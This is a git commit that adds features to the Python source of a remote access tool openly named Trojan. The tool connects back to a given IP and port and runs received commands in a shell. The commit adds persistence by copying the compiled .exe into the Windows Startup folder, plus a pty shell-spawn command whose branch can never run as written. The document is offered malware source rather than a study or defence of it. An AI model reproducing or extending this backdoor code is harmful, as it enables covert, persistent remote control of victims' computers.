844abe5d431b249a3657fb827288301d971d6f07
RodrigoPaulaLopes <rodrigo.plopesti@gmail.com>
2024-04-07 14:35:41 -0300

    feat: generating .exe file and persistence

--- main.py
+++ main.py
@@ -2,13 +2,22 @@
 import socket
 import subprocess
 import time
+import os
 
 
 class Trojan:
     def __init__(self, ip, port):
         self.ip = ip
         self.port = port
+        self.autorun()
 
+
+    def autorun(self):
+        try:
+            filename = os.path.basename(__file__).replace(".py", ".exe")
+            os.system(f"copy {filename} \"C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\")
+        except Exception as e:
+            print(e)
 
     def connect(self):
         while True:
@@ -38,6 +47,10 @@ class Trojan:
     def execute_command(self, command):
         if command != "/exit":
             proc = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
+            return proc.stdout.read()
+        elif command == "/spaw":
+            shell = "python -c 'import pty; pty.spawn(\"/bin/sh\")'"
+            proc = subprocess.Popen(shell, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
             return proc.stdout.read()
         else:
             return "Waiting..."
